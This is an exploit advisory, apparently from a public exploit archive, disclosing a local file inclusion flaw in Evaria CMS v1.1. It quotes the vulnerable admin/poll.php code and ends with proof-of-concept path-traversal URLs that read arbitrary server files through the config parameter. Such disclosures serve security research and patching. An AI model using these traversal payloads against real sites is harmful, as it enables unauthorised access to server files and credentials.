@@ -1,0 +1,84 @@
+# Exploit Title: local file include / File Disclosure
+# Date: 
+# Author: khayeye shotor
+# Software Link: http://www.evaria.com/en/?view=download&dload=1
+# Version: Evaria Content Management System v.1.1
+# Thanks:  khayeye sag , kandome mivei , sinehaye amam and all amehaye irani
+-----------
+
+
+vul code: /path/admin/poll.php
+
+           $file_contents = file("admin/".$current_poll);
+             if (((isset($vote_logging))) && (($vote_logging == 1) || ($vote_logging == 3))) {
+                foreach ($file_contents as $line) {
+                        if (eregi($REMOTE_ADDR, $line)) {
+                           display_form();
+						   echo "<TABLE align=\"center\" width=\"100%\" cellspacing=\"2\" cellpadding=\"2\" border=\"0\">\n  <TR>\n";
+						   echo "    <TD class=\"poll_status\" align=\"center\">" . $already_voted . "</TD>\n";
+						   echo "  </TR>\n</TABLE>\n";
+                           $set_already_voted = 1;
+                           $vote_allow = 0;
+                           break;
+                        }
+                }
+             }
+             if (((isset($vote_logging))) && (($vote_logging == 2) || ($vote_logging == 3))) {
+                if ((isset($voted)) && ($voted == "on")) {
+                   if (!$set_already_voted) {
+                      display_form();
+					  echo "<TABLE align=\"center\" width=\"100%\" cellspacing=\"2\" cellpadding=\"2\" border=\"0\">\n  <TR>\n";
+					  echo "    <TD class=\"poll_status\" align=\"center\">" . $already_voted . "</TD>\n";
+					  echo "  </TR>\n</TABLE>\n";
+                   }
+                   $vote_allow = 0;
+                   break;
+                }
+             }
+             if ($vote_allow) {
+                $poll_string = $vote . "|" . $REMOTE_ADDR . "\n";
+                $fp = fopen("admin/".$current_poll, "a");
+                $string_size = strlen($poll_string);
+                if (fputs($fp, $poll_string, $string_size)) {
+                   display_form();
+				   echo "<TABLE align=\"center\" width=\"100%\" cellspacing=\"2\" cellpadding=\"2\" border=\"0\">\n  <TR>\n";
+				   echo "    <TD class=\"poll_status\" align=\"center\">" . $vote_cast . "</TD>\n";
+				   echo "  </TR>\n</TABLE>\n";
+                }
+                fclose($fp);
+             }
+          }
+          break;
+		  
+	   case "default": 
+	   display_form();
+	   break;
+
+   }
+}
+
+// Display poll form if no view is called upon...
+if (!isset($mode)) {
+   display_form();
+}
+elseif ((isset($vote) == 0) && (isset($mode))) {
+   display_form();
+   echo "<TABLE align=\"center\" width=\"100%\" cellspacing=\"2\" cellpadding=\"2\" border=\"0\">\n  <TR>\n";
+   echo "    <TD class=\"poll_status\" align=\"center\">" . $no_selection . "</TD>\n";
+   echo "  </TR>\n</TABLE>\n";
+}
+
+function display_form() {
+         global $config;
+         global $no_voting;
+		 global $QUERY_STRING;
+         echo "<FORM name=\"poll\" action=\"?" . $QUERY_STRING . "\" method=\"post\">\n";
+		 echo "<TABLE align=\"center\" width=\"100%\" cellspacing=\"2\" cellpadding=\"2\" border=\"0\">\n";
+		 echo "  <TR>\n"; 
+         $answers = file("admin/".$config);
+------------------------------------------------
+
+poc:
+/admin/poll.php?config=../../eprint.php
+
+/admin/poll.php?config=[local file]
